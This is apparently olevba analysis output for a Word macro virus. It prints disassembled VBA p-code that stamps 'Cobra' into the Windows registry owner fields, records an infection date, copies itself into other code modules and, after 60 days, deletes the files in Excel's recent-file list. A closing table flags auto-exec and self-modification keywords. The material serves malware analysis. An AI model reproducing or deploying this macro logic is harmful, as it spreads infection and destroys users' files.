' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0073 "ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0016 "If Not IsDate(ID) Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x008B "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate") = Format(Date, "mm/dd/yyyy")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0073 "ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "DT = Format(Date, "mm/dd/yyyy")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0026 "IF DateValue(DT)-DateValue(ID)>60 Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "Dim FL(4)"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "For i = 1 To 4"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0088 "FL(i) = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", "File" & Trim(Str(i)))"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "For i = 1 To 4"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001C "If FL(i)<>"" Then Kill FL(i)"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	St MoreCode 
' Line #128:
' 	LitDI2 0x0001 
' 	Ld MoreCode 
' 	Ld CM 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	LineCont 0x0004 09 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #131:
' 	EndSub 
' Macros/VBA/MoreInfect - 2695 bytes
' Line #0:
' 	FuncDefn (Sub FileNew())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SR 
' Line #4:
' 	Ld SR 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitStr 0x0015 "349,PB/ER/DHK-1217/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #9:
' 	Ld ID 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #10:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #13:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St DT 
' Line #14:
' 	Ld DT 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x003C 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0004 
' 	VarDefn FL
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #17:
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List"
' 	LitStr 0x0004 "File"
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld i 
' 	ArgsSt FL 0x0001 
' Line #18:
' 	StartForVariable 
' 	Next 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #20:
' 	Ld i 
' 	ArgsLd FL 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd FL 0x0001 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

